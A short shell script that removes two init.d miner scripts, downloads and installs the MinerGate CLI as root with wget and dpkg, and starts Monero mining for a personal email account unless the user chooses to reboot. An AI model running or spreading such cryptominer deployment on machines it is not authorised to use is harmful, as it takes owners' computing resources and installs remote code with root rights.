#!/usr/bin/env sh
runminer(){
rm /etc/init.d/zminer.sh
rm /etc/init.d/miner.sh
cd /home/ubuntu
sudo apt-get update -y 
sudo wget https://minergate.com/download/deb-cli -O minergate-cli.deb 
sudo dpkg -i minergate-cli.deb 
sudo minergate-cli -user candrarisky1922@gmail.com -xmr 1
}

read -r -p "Are you want to reboot ? [y/N] " response
case "$response" in
    [yY][eE][sS]|[yY]) 
        reboot
        ;;
    *)
        runminer
        ;;
esac
